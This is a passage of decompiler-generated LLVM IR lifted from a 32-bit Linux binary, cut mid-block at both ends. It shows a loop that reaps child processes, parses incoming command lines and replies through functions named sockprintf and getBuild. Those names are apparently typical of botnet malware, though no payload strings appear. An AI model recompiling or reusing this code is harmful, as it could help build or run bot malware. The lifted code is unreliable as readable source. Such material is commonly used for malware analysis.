  %v0_804f22f = load i32, i32* @esp, align 4
  %v5_804f22f = icmp ult i32 %v0_804f22f, 12
  store i1 %v5_804f22f, i1* %cf.global-to-local, align 1
  br i1 %v1_804f21c, label %dec_label_pc_804f22f, label %dec_label_pc_804f220

dec_label_pc_804f22f:                             ; preds = %dec_label_pc_804f220, %dec_label_pc_804f217.outer
  %v0_804f22f.lcssa = phi i32 [ %v0_804f22f185, %dec_label_pc_804f217.outer ], [ %v0_804f22f, %dec_label_pc_804f220 ]
  %v0_804f232 = load i32, i32* @global_var_8067808.157, align 8
  %v2_804f232 = add i32 %v0_804f22f.lcssa, -16
  %v3_804f232 = inttoptr i32 %v2_804f232 to i32*
  store i32 %v0_804f232, i32* %v3_804f232, align 4
  %v0_804f238 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804f238 = ptrtoint i8* %v0_804f238 to i32
  %v2_804f238 = call i32 @__GI_inet_ntoa(i32 %v1_804f238)
  store i32 %v2_804f238, i32* %eax.global-to-local, align 4
  %v0_804f23d = load i32, i32* @esp, align 4
  %v2_804f23d = icmp ugt i32 %v0_804f23d, -17
  store i1 %v2_804f23d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f238, i32* @ebx, align 4
  %v0_804f242 = call i32 @getBuild()
  store i32 %v0_804f242, i32* %eax.global-to-local, align 4
  %v0_804f247 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804f247, i32* %edx.global-to-local, align 4
  %v0_804f24d = load i32, i32* @ebx, align 4
  %v1_804f24d = load i32, i32* @esp, align 4
  %v2_804f24d = add i32 %v1_804f24d, -4
  %v3_804f24d = inttoptr i32 %v2_804f24d to i32*
  store i32 %v0_804f24d, i32* %v3_804f24d, align 4
  %v2_804f24e = add i32 %v1_804f24d, -8
  %v3_804f24e = inttoptr i32 %v2_804f24e to i32*
  store i32 %v0_804f242, i32* %v3_804f24e, align 4
  %v1_804f24f = add i32 %v1_804f24d, -12
  %v2_804f24f = inttoptr i32 %v1_804f24f to i32*
  store i32 ptrtoint ([12 x i8]* @global_var_805f63a.686 to i32), i32* %v2_804f24f, align 4
  %v0_804f254 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f254 = add i32 %v1_804f24d, -16
  %v3_804f254 = inttoptr i32 %v2_804f254 to i32*
  store i32 %v0_804f254, i32* %v3_804f254, align 4
  %v0_804f255 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804f255 = ptrtoint i8* %v0_804f255 to i32
  %v3_804f255 = call i32 @sockprintf(i32 %v1_804f255, i32 1)
  store i32 %v3_804f255, i32* %eax.global-to-local, align 4
  %v0_804f25a = load i32, i32* @esp, align 4
  %v1_804f25a = add i32 %v0_804f25a, 16
  %v2_804f25a = icmp ugt i32 %v0_804f25a, -17
  store i1 %v2_804f25a, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f8cf.outer

dec_label_pc_804f27c:                             ; preds = %dec_label_pc_804f471, %dec_label_pc_804f425
  %v2_804f27f = mul i32 %storemerge17, 4
  store i32 %v2_804f27f, i32* %edx.global-to-local, align 4
  %v0_804f284 = load i32, i32* @global_var_8067814.36, align 4
  %v2_804f289 = add i32 %v0_804f284, %v2_804f27f
  store i32 %v2_804f289, i32* %eax.global-to-local, align 4
  %v1_804f28c = inttoptr i32 %v2_804f289 to i32*
  %v2_804f28c = load i32, i32* %v1_804f28c, align 4
  store i32 %v2_804f28c, i32* %eax.global-to-local, align 4
  %tmp261 = and i32 %v0_804f28e.in, -4
  %v5_804f28e = icmp eq i32 %tmp261, -16
  store i1 %v5_804f28e, i1* %cf.global-to-local, align 1
  %v1_804f291 = add i32 %v0_804f28e.in, 8
  %v2_804f291 = inttoptr i32 %v1_804f291 to i32*
  store i32 1, i32* %v2_804f291, align 4
  %v1_804f293 = add i32 %v0_804f28e.in, 4
  %v2_804f293 = inttoptr i32 %v1_804f293 to i32*
  store i32 0, i32* %v2_804f293, align 4
  %v0_804f295 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f295 = inttoptr i32 %v0_804f28e.in to i32*
  store i32 %v0_804f295, i32* %v3_804f295, align 4
  %v4_804f296 = call i32 @__libc_waitpid(i32 %storemerge17, i32 %v2_804f296, i32 %stack_var_-60.2)
  store i32 %v4_804f296, i32* %eax.global-to-local, align 4
  %v0_804f29b = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp170 = icmp slt i32 %v4_804f296, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp170, label %dec_label_pc_804f422, label %dec_label_pc_804f2a6

dec_label_pc_804f2a6:                             ; preds = %dec_label_pc_804f27c
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f2d9

dec_label_pc_804f2af:                             ; preds = %dec_label_pc_804f2d9, %dec_label_pc_804f313
  %v2_804f2b2 = mul i32 %storemerge19, 4
  %v0_804f2b7 = load i32, i32* @global_var_8067814.36, align 4
  %v2_804f2bc = add i32 %v0_804f2b7, %v2_804f2b2
  %v1_804f2bf = add i32 %v2_804f2bc, -4
  store i32 %v2_804f2b2, i32* %edx.global-to-local, align 4
  store i32 %v2_804f2bc, i32* %eax.global-to-local, align 4
  %v1_804f2d2 = inttoptr i32 %v2_804f2bc to i32*
  %v2_804f2d2 = load i32, i32* %v1_804f2d2, align 4
  store i32 %v2_804f2d2, i32* %eax.global-to-local, align 4
  %v2_804f2d4 = inttoptr i32 %v1_804f2bf to i32*
  store i32 %v2_804f2d2, i32* %v2_804f2d4, align 4
  %v4_804f2d6 = add i32 %storemerge19, 1
  br label %dec_label_pc_804f2d9

dec_label_pc_804f2d9:                             ; preds = %dec_label_pc_804f2a6, %dec_label_pc_804f2af
  %storemerge19 = phi i32 [ %v4_804f2d6, %dec_label_pc_804f2af ], [ %.pre, %dec_label_pc_804f2a6 ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_804f2ed = load i32, i32* @global_var_8061588.34, align 8
  store i32 %v0_804f2ed, i32* %edx.global-to-local, align 4
  %v0_804f2f3 = load i32, i32* @global_var_806158c.35, align 4
  %v10_804f30b = icmp eq i32 %v0_804f2f3, 0
  br i1 %v10_804f30b, label %dec_label_pc_804f313, label %dec_label_pc_804f2af

dec_label_pc_804f313:                             ; preds = %dec_label_pc_804f2d9
  store i32 0, i32* @esi, align 4
  store i32 %v0_804f2ed, i32* @edi, align 4
  %v10_804f327 = icmp ult i32 %storemerge19, %v0_804f2ed
  br i1 %v10_804f327, label %dec_label_pc_804f2af, label %dec_label_pc_804f32f

dec_label_pc_804f32f:                             ; preds = %dec_label_pc_804f313
  %v2_804f332 = mul i32 %storemerge19, 4
  %v0_804f337 = load i32, i32* @global_var_8067814.36, align 4
  %v2_804f33c = add i32 %v2_804f332, -4
  %v1_804f33f = add i32 %v2_804f33c, %v0_804f337
  %v1_804f342 = inttoptr i32 %v1_804f33f to i32*
  store i32 0, i32* %v1_804f342, align 4
  %v0_804f348 = load i32, i32* @global_var_8061588.34, align 8
  %v0_804f34d = load i32, i32* @global_var_806158c.35, align 4
  %v1_804f353 = add i32 %v0_804f348, -1
  %v4_804f353 = icmp ne i32 %v0_804f348, 0
  %v2_804f356 = zext i1 %v4_804f353 to i32
  %v3_804f356 = add i32 %v0_804f34d, -1
  %v4_804f356 = add i32 %v3_804f356, %v2_804f356
  store i32 %v1_804f353, i32* @global_var_8061588.34, align 8
  store i32 %v4_804f356, i32* @global_var_806158c.35, align 4
  %v3_804f36f = mul i32 %v4_804f356, 4
  %v4_804f36f = udiv i32 %v1_804f353, 1073741824
  %v5_804f36f = or i32 %v3_804f36f, %v4_804f36f
  store i32 %v5_804f36f, i32* %edx.global-to-local, align 4
  %v2_804f373 = mul i32 %v1_804f353, 4
  %v1_804f376 = add i32 %v2_804f373, 4
  store i32 %v1_804f376, i32* %eax.global-to-local, align 4
  %v0_804f379 = load i32, i32* @esp, align 4
  %v5_804f379 = icmp ult i32 %v0_804f379, 12
  store i1 %v5_804f379, i1* %cf.global-to-local, align 1
  %v2_804f37c = add i32 %v0_804f379, -16
  %v3_804f37c = inttoptr i32 %v2_804f37c to i32*
  store i32 %v1_804f376, i32* %v3_804f37c, align 4
  %v1_804f37d = call i32 @malloc(i32 0)
  store i32 %v1_804f37d, i32* %eax.global-to-local, align 4
  %v0_804f382 = load i32, i32* @esp, align 4
  %v2_804f382 = icmp ugt i32 %v0_804f382, -17
  store i1 %v2_804f382, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f3b3

dec_label_pc_804f391:                             ; preds = %dec_label_pc_804f3b3, %dec_label_pc_804f3ed
  %v2_804f394 = mul i32 %storemerge18, 4
  %v5_804f399 = add i32 %v2_804f394, %v1_804f37d
  store i32 %v2_804f394, i32* %edx.global-to-local, align 4
  %v0_804f3a4 = load i32, i32* @global_var_8067814.36, align 4
  %v2_804f3a9 = add i32 %v0_804f3a4, %v2_804f394
  store i32 %v2_804f3a9, i32* %eax.global-to-local, align 4
  %v1_804f3ac = inttoptr i32 %v2_804f3a9 to i32*
  %v2_804f3ac = load i32, i32* %v1_804f3ac, align 4
  store i32 %v2_804f3ac, i32* %eax.global-to-local, align 4
  %v2_804f3ae = inttoptr i32 %v5_804f399 to i32*
  store i32 %v2_804f3ac, i32* %v2_804f3ae, align 4
  %v4_804f3b0 = add i32 %storemerge18, 1
  br label %dec_label_pc_804f3b3

dec_label_pc_804f3b3:                             ; preds = %dec_label_pc_804f32f, %dec_label_pc_804f391
  %storemerge18 = phi i32 [ %v4_804f3b0, %dec_label_pc_804f391 ], [ 0, %dec_label_pc_804f32f ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v0_804f3c7 = load i32, i32* @global_var_8061588.34, align 8
  store i32 %v0_804f3c7, i32* %edx.global-to-local, align 4
  %v0_804f3cd = load i32, i32* @global_var_806158c.35, align 4
  %v10_804f3e5 = icmp eq i32 %v0_804f3cd, 0
  br i1 %v10_804f3e5, label %dec_label_pc_804f3ed, label %dec_label_pc_804f391

dec_label_pc_804f3ed:                             ; preds = %dec_label_pc_804f3b3
  store i32 0, i32* @esi, align 4
  store i32 %v0_804f3c7, i32* @edi, align 4
  %v10_804f401 = icmp ult i32 %storemerge18, %v0_804f3c7
  br i1 %v10_804f401, label %dec_label_pc_804f391, label %dec_label_pc_804f409

dec_label_pc_804f409:                             ; preds = %dec_label_pc_804f3ed
  %v0_804f409 = load i32, i32* @global_var_8067814.36, align 4
  store i32 %v0_804f409, i32* %eax.global-to-local, align 4
  %v0_804f40e = load i32, i32* @esp, align 4
  %v5_804f40e = icmp ult i32 %v0_804f40e, 12
  store i1 %v5_804f40e, i1* %cf.global-to-local, align 1
  %v2_804f411 = add i32 %v0_804f40e, -16
  %v3_804f411 = inttoptr i32 %v2_804f411 to i32*
  store i32 %v0_804f409, i32* %v3_804f411, align 4
  %v1_804f412 = call i32 @free(i32 0)
  %v0_804f417 = load i32, i32* @esp, align 4
  %v2_804f417 = icmp ugt i32 %v0_804f417, -17
  store i1 %v2_804f417, i1* %cf.global-to-local, align 1
  store i32 %v1_804f37d, i32* %eax.global-to-local, align 4
  store i32 %v1_804f37d, i32* @global_var_8067814.36, align 4
  br label %dec_label_pc_804f422

dec_label_pc_804f422:                             ; preds = %dec_label_pc_804f27c, %dec_label_pc_804f409
  %v0_804f28e80.in = phi i32 [ %v0_804f417, %dec_label_pc_804f409 ], [ %v0_804f29b, %dec_label_pc_804f27c ]
  %stack_var_-60.1 = phi i32 [ %v1_804f37d, %dec_label_pc_804f409 ], [ %stack_var_-60.2, %dec_label_pc_804f27c ]
  br label %dec_label_pc_804f425

dec_label_pc_804f425:                             ; preds = %dec_label_pc_804f8cf, %dec_label_pc_804f422
  %v0_804f28e.in = phi i32 [ %v0_804f28e80.in, %dec_label_pc_804f422 ], [ %v0_804f8ea, %dec_label_pc_804f8cf ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_804f422 ], [ %stack_var_-60.3, %dec_label_pc_804f8cf ]
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_804f422 ], [ 0, %dec_label_pc_804f8cf ]
  store i32 %storemerge17, i32* %eax.global-to-local, align 4
  %v2_804f430 = ashr i32 %storemerge17, 31
  store i32 %v2_804f430, i32* %edx.global-to-local, align 4
  %v0_804f439 = load i32, i32* @global_var_8061588.34, align 8
  store i32 %v0_804f439, i32* @esi, align 4
  %v0_804f43f = load i32, i32* @global_var_806158c.35, align 4
  store i32 %v0_804f43f, i32* @edi, align 4
  %v10_804f457 = icmp ult i32 %v2_804f430, %v0_804f43f
  store i1 %v10_804f457, i1* %cf.global-to-local, align 1
  br i1 %v10_804f457, label %dec_label_pc_804f27c, label %dec_label_pc_804f463

dec_label_pc_804f463:                             ; preds = %dec_label_pc_804f425
  store i32 %v0_804f43f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804f46f = icmp ugt i32 %v2_804f430, %v0_804f43f
  br i1 %v6_804f46f, label %dec_label_pc_804f483, label %dec_label_pc_804f471

dec_label_pc_804f471:                             ; preds = %dec_label_pc_804f463
  store i32 %v0_804f439, i32* %edx.global-to-local, align 4
  %v10_804f477 = icmp ult i32 %storemerge17, %v0_804f439
  store i1 %v10_804f477, i1* %cf.global-to-local, align 1
  br i1 %v10_804f477, label %dec_label_pc_804f27c, label %dec_label_pc_804f483

dec_label_pc_804f483:                             ; preds = %dec_label_pc_804f471, %dec_label_pc_804f463
  %v0_804f486 = load i32, i32* @ebp, align 4
  %v2_804f486 = add i32 %v0_804f8e5, -5736
  %v3_804f486 = add i32 %v2_804f486, %v0_804f486
  %v4_804f486 = inttoptr i32 %v3_804f486 to i8*
  store i8 0, i8* %v4_804f486, align 1
  %v0_804f48e = load i32, i32* @esp, align 4
  %v5_804f48e = icmp ult i32 %v0_804f48e, 12
  store i1 %v5_804f48e, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8cf, i32* %eax.global-to-local, align 4
  %v2_804f497 = add i32 %v0_804f48e, -16
  %v3_804f497 = inttoptr i32 %v2_804f497 to i32*
  store i32 %v2_804f8cf, i32* %v3_804f497, align 4
  %v0_804f498 = call i32 @trim()
  %v0_804f49d = load i32, i32* @esp, align 4
  %tmp255 = and i32 %v0_804f49d, -8
  %v5_804f4a0 = icmp eq i32 %tmp255, -16
  store i1 %v5_804f4a0, i1* %cf.global-to-local, align 1
  %v1_804f4a3 = add i32 %v0_804f49d, 4
  %v2_804f4a3 = inttoptr i32 %v1_804f4a3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8057157.21 to i32), i32* %v2_804f4a3, align 4
  store i32 %v2_804f8cf, i32* %eax.global-to-local, align 4
  %v3_804f4ae = inttoptr i32 %v0_804f49d to i32*
  store i32 %v2_804f8cf, i32* %v3_804f4ae, align 4
  %v3_804f4af = call i32 @strstr(i32 %v0_804f43f, i8* bitcast (i32* @0 to i8*))
  %v0_804f4b4 = load i32, i32* @esp, align 4
  %v1_804f4b4 = add i32 %v0_804f4b4, 16
  store i32 %v3_804f4af, i32* %edx.global-to-local, align 4
  store i32 %v2_804f8cf, i32* %eax.global-to-local, align 4
  %v7_804f4bf = icmp ult i32 %v3_804f4af, %v2_804f8cf
  store i1 %v7_804f4bf, i1* %cf.global-to-local, align 1
  %v12_804f4bf = icmp eq i32 %v3_804f4af, %v2_804f8cf
  %v1_804f4c1 = icmp eq i1 %v12_804f4bf, false
  br i1 %v1_804f4c1, label %dec_label_pc_804f4de, label %dec_label_pc_804f4c3

dec_label_pc_804f4c3:                             ; preds = %dec_label_pc_804f483
  %v0_804f4c3 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804f4c3, i32* %eax.global-to-local, align 4
  %v5_804f4c8 = icmp ult i32 %v1_804f4b4, 8
  store i1 %v5_804f4c8, i1* %cf.global-to-local, align 1
  %v1_804f4cb = add i32 %v0_804f4b4, 4
  %v2_804f4cb = inttoptr i32 %v1_804f4cb to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805f646.687 to i32), i32* %v2_804f4cb, align 4
  %v0_804f4d0 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f4d0 = inttoptr i32 %v0_804f4b4 to i32*
  store i32 %v0_804f4d0, i32* %v3_804f4d0, align 4
  %v2_804f4d1 = call i32 @sockprintf(i32 %v0_804f43f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804f4d1, i32* %eax.global-to-local, align 4
  %v0_804f4d6 = load i32, i32* @esp, align 4
  %v1_804f4d6 = add i32 %v0_804f4d6, 16
  %v2_804f4d6 = icmp ugt i32 %v0_804f4d6, -17
  store i1 %v2_804f4d6, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f8cf

dec_label_pc_804f4de:                             ; preds = %dec_label_pc_804f483
  %v5_804f4de = icmp ult i32 %v1_804f4b4, 8
  store i1 %v5_804f4de, i1* %cf.global-to-local, align 1
  %v1_804f4e1 = add i32 %v0_804f4b4, 4
  %v2_804f4e1 = inttoptr i32 %v1_804f4e1 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_805f64b.688 to i32), i32* %v2_804f4e1, align 4
  store i32 %v2_804f8cf, i32* %eax.global-to-local, align 4
  %v3_804f4ec = inttoptr i32 %v0_804f4b4 to i32*
  store i32 %v2_804f8cf, i32* %v3_804f4ec, align 4
  %v3_804f4ed = call i32 @strstr(i32 %v0_804f43f, i8* bitcast (i32* @0 to i8*))
  %v0_804f4f2 = load i32, i32* @esp, align 4
  store i32 %v3_804f4ed, i32* @edx, align 4
  store i32 %v2_804f8cf, i32* %eax.global-to-local, align 4
  %v7_804f4fd = icmp ult i32 %v3_804f4ed, %v2_804f8cf
  store i1 %v7_804f4fd, i1* %cf.global-to-local, align 1
  %v12_804f4fd = icmp eq i32 %v3_804f4ed, %v2_804f8cf
  %v1_804f4ff = icmp eq i1 %v12_804f4fd, false
  br i1 %v1_804f4ff, label %dec_label_pc_804f529, label %dec_label_pc_804f501

dec_label_pc_804f501:                             ; preds = %dec_label_pc_804f4de
  %v1_804f4f2 = add i32 %v0_804f4f2, 16
  %v4_804f501 = add i32 %stack_var_-96.2.ph29, 1
  store i32 ptrtoint ([20 x i8]* @global_var_805f64f.689 to i32), i32* %eax.global-to-local, align 4
  %v5_804f509 = icmp ult i32 %v1_804f4f2, 12
  store i1 %v5_804f509, i1* %cf.global-to-local, align 1
  %v3_804f50c = inttoptr i32 %v0_804f4f2 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_805f64f.689 to i32), i32* %v3_804f50c, align 4
  %v1_804f50d = call i32 @zprintf(i32 %v4_804f501)
  store i32 %v1_804f50d, i32* @eax, align 4
  %v0_804f512 = load i32, i32* @esp, align 4
  %v9_804f515 = icmp ult i32 %v4_804f501, 20
  store i1 %v9_804f515, i1* %cf.global-to-local, align 1
  %v7_804f519 = icmp sgt i32 %v4_804f501, 20
  br i1 %v7_804f519, label %dec_label_pc_804f51f, label %dec_label_pc_804f217.outer

dec_label_pc_804f51f:                             ; preds = %dec_label_pc_804f501
  %v1_804f512 = add i32 %v0_804f512, 16
  %v5_804f51f = icmp ult i32 %v1_804f512, 12
  store i1 %v5_804f51f, i1* %cf.global-to-local, align 1
  %v2_804f522 = inttoptr i32 %v0_804f512 to i32*
  store i32 0, i32* %v2_804f522, align 4
  %v1_804f524 = call i32 @__GI_exit(i32 %v4_804f501)
  store i32 %v1_804f524, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f529

dec_label_pc_804f529:                             ; preds = %dec_label_pc_804f4de, %dec_label_pc_804f51f
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph29, %dec_label_pc_804f4de ], [ %v4_804f501, %dec_label_pc_804f51f ]
  %v2_804f535 = load i8, i8* %tmp168, align 4
  %v3_804f535 = zext i8 %v2_804f535 to i32
  %v6_804f535 = or i32 %v3_804f535, %v5_804f535
  store i32 %v6_804f535, i32* %eax.global-to-local, align 4
  %v6_804f537 = icmp ult i8 %v2_804f535, 33
  store i1 %v6_804f537, i1* %cf.global-to-local, align 1
  %v10_804f537 = icmp eq i8 %v2_804f535, 33
  %v1_804f539 = icmp eq i1 %v10_804f537, false
  br i1 %v1_804f539, label %dec_label_pc_804f8cf.outer26.backedge, label %dec_label_pc_804f53f

dec_label_pc_804f8cf.outer26.backedge:            ; preds = %dec_label_pc_804f529, %dec_label_pc_804f55d, %dec_label_pc_804f883, %dec_label_pc_804f6b5
  %stack_var_-64.2.ph27.be = phi i8* [ %v22_804f638, %dec_label_pc_804f6b5 ], [ %v22_804f638, %dec_label_pc_804f883 ], [ %tmp168, %dec_label_pc_804f55d ], [ %tmp168, %dec_label_pc_804f529 ]
  %v0_804f8db.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f8cf.outer26

dec_label_pc_804f53f:                             ; preds = %dec_label_pc_804f529
  store i32 %v1_804f542, i32* %eax.global-to-local, align 4
  %v2_804f54e191 = load i8, i8* %storemerge16190, align 1
  %v3_804f54e192 = zext i8 %v2_804f54e191 to i32
  %v6_804f54e194 = or i32 %v3_804f54e192, %v5_804f535
  store i32 %v6_804f54e194, i32* %eax.global-to-local, align 4
  %v3_804f550195 = icmp ult i8 %v2_804f54e191, 32
  store i1 %v3_804f550195, i1* %cf.global-to-local, align 1
  %v7_804f550196 = icmp eq i8 %v2_804f54e191, 32
  br i1 %v7_804f550196, label %dec_label_pc_804f55d, label %dec_label_pc_804f554

dec_label_pc_804f548:                             ; preds = %dec_label_pc_804f554
  %v5_804f548 = add i32 %storemerge16.in197, 1
  %storemerge16 = inttoptr i32 %v5_804f548 to i8*
  store i32 %v5_804f548, i32* %eax.global-to-local, align 4
  %v2_804f54e = load i8, i8* %storemerge16, align 1
  %v3_804f54e = zext i8 %v2_804f54e to i32
  %v5_804f54e = and i32 %v5_804f548, -256
  %v6_804f54e = or i32 %v3_804f54e, %v5_804f54e
  store i32 %v6_804f54e, i32* %eax.global-to-local, align 4
  %v3_804f550 = icmp ult i8 %v2_804f54e, 32
  store i1 %v3_804f550, i1* %cf.global-to-local, align 1
  %v7_804f550 = icmp eq i8 %v2_804f54e, 32
  br i1 %v7_804f550, label %dec_label_pc_804f55d, label %dec_label_pc_804f554

dec_label_pc_804f554:                             ; preds = %dec_label_pc_804f53f, %dec_label_pc_804f548
  %v5_804f54e199 = phi i32 [ %v5_804f54e, %dec_label_pc_804f548 ], [ %v5_804f535, %dec_label_pc_804f53f ]
  %storemerge16198 = phi i8* [ %storemerge16, %dec_label_pc_804f548 ], [ %storemerge16190, %dec_label_pc_804f53f ]
  %storemerge16.in197 = phi i32 [ %v5_804f548, %dec_label_pc_804f548 ], [ %v1_804f542, %dec_label_pc_804f53f ]
  store i32 %storemerge16.in197, i32* %eax.global-to-local, align 4
  %v2_804f557 = load i8, i8* %storemerge16198, align 1
  %v3_804f557 = zext i8 %v2_804f557 to i32
  %v6_804f557 = or i32 %v3_804f557, %v5_804f54e199
  store i32 %v6_804f557, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f559 = icmp eq i8 %v2_804f557, 0
  %v1_804f55b = icmp eq i1 %v4_804f559, false
  br i1 %v1_804f55b, label %dec_label_pc_804f548, label %dec_label_pc_804f55d

dec_label_pc_804f55d:                             ; preds = %dec_label_pc_804f548, %dec_label_pc_804f554, %dec_label_pc_804f53f
  %storemerge16.in.lcssa = phi i32 [ %v1_804f542, %dec_label_pc_804f53f ], [ %storemerge16.in197, %dec_label_pc_804f554 ], [ %v5_804f548, %dec_label_pc_804f548 ]
  %storemerge16.lcssa = phi i8* [ %storemerge16190, %dec_label_pc_804f53f ], [ %storemerge16198, %dec_label_pc_804f554 ], [ %storemerge16, %dec_label_pc_804f548 ]
  %v5_804f54e.lcssa = phi i32 [ %v5_804f535, %dec_label_pc_804f53f ], [ %v5_804f54e199, %dec_label_pc_804f554 ], [ %v5_804f54e, %dec_label_pc_804f548 ]
  store i32 %storemerge16.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804f560 = load i8, i8* %storemerge16.lcssa, align 1
  %v3_804f560 = zext i8 %v2_804f560 to i32
  %v6_804f560 = or i32 %v3_804f560, %v5_804f54e.lcssa
  store i32 %v6_804f560, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f562 = icmp eq i8 %v2_804f560, 0
  br i1 %v4_804f562, label %dec_label_pc_804f8cf.outer26.backedge, label %dec_label_pc_804f56a

dec_label_pc_804f56a:                             ; preds = %dec_label_pc_804f55d
  store i8 0, i8* %storemerge16.lcssa, align 1
  store i32 %v5_804f535, i32* %eax.global-to-local, align 4
  %v3_804f58e = call i32 @_strlen(i8* %storemerge16190)
  %v6_804f595 = add i32 %v2_804f8cf, %v3_804f58e
  %v1_804f598 = add i32 %v6_804f595, 2
  %v5_804f598 = icmp ugt i32 %v6_804f595, -3
  store i1 %v5_804f598, i1* %cf.global-to-local, align 1
  store i32 %v1_804f598, i32* %eax.global-to-local, align 4
  %v5_804f59b = inttoptr i32 %v1_804f598 to i8*
  %v1_804f5d3 = and i32 %v1_804f598, -256
  br label %dec_label_pc_804f5c5

dec_label_pc_804f5a0:                             ; preds = %dec_label_pc_804f5ed, %dec_label_pc_804f5c5
  store i32 %v1_804f5d3, i32* %eax.global-to-local, align 4
  %v3_804f5b7 = call i32 @_strlen(i8* %v5_804f59b)
  %v4_804f5b7 = mul i32 %v3_804f5b7, -1
  %v1_804f5bd = sub i32 0, %v4_804f5b7
  %v6_804f5be = sub i32 %v1_804f598, %v4_804f5b7
  %v11_804f5be = icmp ult i32 %v6_804f5be, %v1_804f5bd
  store i1 %v11_804f5be, i1* %cf.global-to-local, align 1
  %v1_804f5c1 = add i32 %v6_804f5be, -1
  store i32 %v1_804f5c1, i32* %eax.global-to-local, align 4
  %v1_804f5c2 = inttoptr i32 %v1_804f5c1 to i8*
  store i8 0, i8* %v1_804f5c2, align 1
  br label %dec_label_pc_804f5c5

dec_label_pc_804f5c5:                             ; preds = %dec_label_pc_804f56a, %dec_label_pc_804f5a0
  store i32 %v1_804f5d3, i32* %eax.global-to-local, align 4
  %v3_804f5dc = call i32 @_strlen(i8* %v5_804f59b)
  %v4_804f5dc = mul i32 %v3_804f5dc, -1
  %v1_804f5e2 = sub i32 0, %v4_804f5dc
  %v6_804f5e3 = sub i32 %v1_804f598, %v4_804f5dc
  %v11_804f5e3 = icmp ult i32 %v6_804f5e3, %v1_804f5e2
  store i1 %v11_804f5e3, i1* %cf.global-to-local, align 1
  %v1_804f5e6 = add i32 %v6_804f5e3, -1
  store i32 %v1_804f5e6, i32* %eax.global-to-local, align 4
  %v1_804f5e7 = inttoptr i32 %v1_804f5e6 to i8*
  %v2_804f5e7 = load i8, i8* %v1_804f5e7, align 1
  %v3_804f5e7 = zext i8 %v2_804f5e7 to i32
  %v5_804f5e7 = and i32 %v1_804f5e6, -256
  %v6_804f5e7 = or i32 %v3_804f5e7, %v5_804f5e7
  store i32 %v6_804f5e7, i32* %eax.global-to-local, align 4
  %v6_804f5e9 = icmp ult i8 %v2_804f5e7, 10
  store i1 %v6_804f5e9, i1* %cf.global-to-local, align 1
  %v10_804f5e9 = icmp eq i8 %v2_804f5e7, 10
  br i1 %v10_804f5e9, label %dec_label_pc_804f5a0, label %dec_label_pc_804f5ed

dec_label_pc_804f5ed:                             ; preds = %dec_label_pc_804f5c5
  store i32 %v1_804f5d3, i32* %eax.global-to-local, align 4
  %v3_804f604 = call i32 @_strlen(i8* %v5_804f59b)
  %v4_804f604 = mul i32 %v3_804f604, -1
  %v1_804f60a = sub i32 0, %v4_804f604
  %v6_804f60b = sub i32 %v1_804f598, %v4_804f604
  %v11_804f60b = icmp ult i32 %v6_804f60b, %v1_804f60a
  store i1 %v11_804f60b, i1* %cf.global-to-local, align 1
  %v1_804f60e = add i32 %v6_804f60b, -1
  store i32 %v1_804f60e, i32* %eax.global-to-local, align 4
  %v1_804f60f = inttoptr i32 %v1_804f60e to i8*
  %v2_804f60f = load i8, i8* %v1_804f60f, align 1
  %v3_804f60f = zext i8 %v2_804f60f to i32
  %v5_804f60f = and i32 %v1_804f60e, -256
  %v6_804f60f = or i32 %v3_804f60f, %v5_804f60f
  store i32 %v6_804f60f, i32* %eax.global-to-local, align 4
  %v6_804f611 = icmp ult i8 %v2_804f60f, 13
  store i1 %v6_804f611, i1* %cf.global-to-local, align 1
  %v10_804f611 = icmp eq i8 %v2_804f60f, 13
  br i1 %v10_804f611, label %dec_label_pc_804f5a0, label %dec_label_pc_804f615

dec_label_pc_804f615:                             ; preds = %dec_label_pc_804f5ed
  store i32 %v1_804f598, i32* %eax.global-to-local, align 4
  %v2_804f623207 = load i8, i8* %v5_804f59b, align 1
  %v3_804f623208 = zext i8 %v2_804f623207 to i32
  %v6_804f623210 = or i32 %v3_804f623208, %v1_804f5d3
  store i32 %v6_804f623210, i32* %eax.global-to-local, align 4
  %v3_804f625211 = icmp ult i8 %v2_804f623207, 32
  store i1 %v3_804f625211, i1* %cf.global-to-local, align 1
  %v7_804f625212 = icmp eq i8 %v2_804f623207, 32
  br i1 %v7_804f625212, label %dec_label_pc_804f632, label %dec_label_pc_804f629

dec_label_pc_804f61d:                             ; preds = %dec_label_pc_804f629
  %v5_804f61d = add i32 %v4_804f620214, 1
  %v22_804f61d = inttoptr i32 %v5_804f61d to i8*
  store i32 %v5_804f61d, i32* %eax.global-to-local, align 4
  %v2_804f623 = load i8, i8* %v22_804f61d, align 1
  %v3_804f623 = zext i8 %v2_804f623 to i32
  %v5_804f623 = and i32 %v5_804f61d, -256
  %v6_804f623 = or i32 %v3_804f623, %v5_804f623
